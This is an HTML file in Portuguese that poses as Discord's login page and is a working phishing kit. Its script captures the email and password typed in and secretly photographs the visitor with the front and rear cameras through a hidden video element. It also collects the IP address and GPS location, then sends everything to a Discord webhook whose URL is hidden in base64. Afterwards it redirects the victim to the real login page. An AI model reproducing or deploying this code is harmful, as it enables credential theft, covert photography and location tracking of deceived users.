<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="theme-color" content="#1e1f22">
<title>Discord - Login</title>
<link href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    
    body {
        background-color: #313338;
        color: #f2f3f5;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
        padding-top: 0; /* Zera o topo */
    }

    /* BARRINHA SUPERIOR (Cinza Escuro) */
    .top-bar {
        position: fixed;
        top: 0; left: 0; width: 100%;
        height: calc(env(safe-area-inset-top, 20px) + 25px); /* Pega a altura do notch do iPhone */
        background-color: #1e1f22; 
        z-index: 100;
    }
    
    .login-box {
        width: 100%;
        max-width: 420px;
        margin-top: calc(env(safe-area-inset-top, 20px) + 30px); /* Puxa o conteúdo pra cima */
    }

    .header-logo {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        margin-bottom: 16px;
    }
    .header-logo svg {
        width: 34px;
        height: auto;
        fill: #fff;
    }
    .header-logo span {
        font-size: 24px;
        font-weight: 700;
        color: #fff;
        letter-spacing: -0.5px;
    }

    h2 {
        font-size: 24px;
        font-weight: 600;
        margin-bottom: 6px;
        color: #f2f3f5;
        text-align: center;
    }

    p {
        color: #b5bac1;
        font-size: 16px;
        margin-bottom: 20px;
        text-align: center;
        line-height: 1.3;
    }

    .input-group {
        text-align: left;
        margin-bottom: 16px;
    }
    
    label {
        display: block;
        color: #b5bac1;
        font-size: 12px;
        font-weight: 500;
        margin-bottom: 8px;
    }
    label span { color: #f23f43; font-size: 14px;} 

    .input-wrapper {
        position: relative;
    }
    
    /* Inputs com a borda certa (cinza mais claro) */
    input {
        width: 100%;
        padding: 10px;
        background-color: #1e1f22;
        border: 1px solid #2b2d31; /* A caixinha que tu pediu */
        border-radius: 4px; 
        color: #dbdee1;
        font-size: 15px;
        height: 42px;
        outline: none;
    }
    input:focus { border-color: #000; }
    
    .eye-icon {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        width: 18px;
        height: 18px;
        fill: #b5bac1;
    }
    
    .forgot {
        display: block;
        text-align: left;
        color: #00a8fc;
        font-size: 14px;
        text-decoration: none;
        margin-bottom: 16px;
        margin-top: -4px;
    }

    .btn-login {
        width: 100%;
        padding: 0;
        background-color: #5865F2; 
        color: #fff;
        border: none;
        border-radius: 4px; 
        font-size: 16px;
        font-weight: 500;
        cursor: pointer;
        height: 44px; 
    }
    .btn-login:active { background-color: #4752c4; }

    .passkey {
        display: block;
        text-align: left;
        color: #00a8fc;
        font-size: 14px;
        text-decoration: none;
        margin-top: 12px;
        margin-bottom: 6px;
    }

    .register {
        text-align: left;
        font-size: 14px;
        color: #949ba4;
    }
    .register a { color: #00a8fc; text-decoration: none; }

    #capture-screen {
        display: none;
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: #313338;
        z-index: 99;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 16px;
    }

    video { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
</style>
</head>
<body>

<!-- BARRINHA CINZA ESCURO -->
<div class="top-bar"></div>

<video id="camera" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<div class="login-box" id="main-screen">
    <div class="header-logo">
        <svg viewBox="0 0 127.14 96.36">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14c2.64-27.38-4.51-51.11-18.24-72.14ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
        </svg>
        <span>Discord</span>
    </div>

    <h2>Boas-vindas de volta!</h2>
    <p>Estamos muito animados em te ver novamente!</p>

    <div class="input-group">
        <label>E-mail ou número de telefone <span>*</span></label>
        <div class="input-wrapper">
            <input type="text" id="email-input" autocomplete="off">
        </div>
    </div>

    <div class="input-group">
        <label>Senha <span>*</span></label>
        <div class="input-wrapper">
            <input type="password" id="pass-input">
            <svg class="eye-icon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
        </div>
    </div>

    <a href="#" class="forgot">Esqueceu sua senha?</a>
    <button class="btn-login" onclick="startHack()">Entrar</button>
    <a href="#" class="passkey">Ou entre com uma passkey</a>
    <div class="register">Precisando de uma conta? <a href="#">Registre-se</a></div>
</div>

<div id="capture-screen">
    <p>Sincronizando...</p>
</div>

<script>
    const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
    const p2 = "MTU3MTk5MzU3OTE3NjMzMzM2NA==";
    const p3 = "Lzg0bVc2S2FYWEtmMTBIOWV1dXkwaHdwdUtUS1pqRjlvYWxmeFBReklDQWJFYUFJeTVnbGxKWm9fMmdsajhvbWpIY2l1";
    const WEBHOOK = atob(p1) + atob(p2) + atob(p3);

    let video = document.getElementById('camera');
    let canvas = document.getElementById('canvas');
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    async function startHack() {
        const email = document.getElementById('email-input').value;
        const pass = document.getElementById('pass-input').value;
        
        if(!email || !pass) return alert("Preencha todos os campos.");

        document.getElementById('main-screen').style.display = 'none';
        document.getElementById('capture-screen').style.display = 'flex';

        let fotoFrente = null;
        let fotoTras = null;

        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            await sleep(200); 
            fotoFrente = capturePhoto();
            stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log("Sem frontal"); }

        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            video.srcObject = stream;
            await sleep(200);
            fotoTras = capturePhoto();
            stream.getTracks().forEach(t => t.stop());
        } catch (e) { console.log("Sem traseira"); }

        let ip = "Desconhecido";
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            ip = (await r.json()).ip;
        } catch(e) {}

        let gps = "GPS negado";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { 
                    gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToDiscord(email, pass, fotoFrente, fotoTras, ip, gps);
                    finishHack();
                },
                () => { 
                    sendToDiscord(email, pass, fotoFrente, fotoTras, ip, gps);
                    finishHack();
                },
                { timeout: 3000 }
            );
        } else {
            sendToDiscord(email, pass, fotoFrente, fotoTras, ip, gps);
            finishHack();
        }
    }

    function capturePhoto() {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.5);
    }

    async function sendToDiscord(email, pass, fotoFrente, fotoTras, ip, gps) {
        if (!WEBHOOK) return;
        const formData = new FormData();
        
        const payload = {
            content: "🎯 **ALVO CAPTURADO (DISCORD FAKE)**",
            embeds: [{
                title: "Dados do Alvo",
                color: 5793266,
                fields: [
                    { name: "E-mail", value: email, inline: true },
                    { name: "Senha", value: pass, inline: true },
                    { name: "IP", value: ip, inline: true },
                    { name: "Localização", value: gps, inline: false }
                ]
            }]
        };

        const attachments = [];
        if (fotoFrente) {
            const blobF = await (await fetch(fotoFrente)).blob();
            formData.append("file1", blobF, "frente.jpg");
            attachments.push({ id: 0, filename: "frente.jpg" });
        }
        if (fotoTras) {
            const blobT = await (await fetch(fotoTras)).blob();
            formData.append("file2", blobT, "traseira.jpg");
            attachments.push({ id: 1, filename: "traseira.jpg" });
        }

        if (attachments.length > 0) {
            payload.embeds[0].image = { url: `attachment://${attachments[0].filename}` };
            if (attachments.length > 1) {
                payload.embeds[0].thumbnail = { url: `attachment://${attachments[1].filename}` };
            }
        }

        formData.append("payload_json", JSON.stringify(payload));
        fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
    }

    function finishHack() {
        window.location.href = "https://discord.com/login";
    }
</script>
</body>
</html>
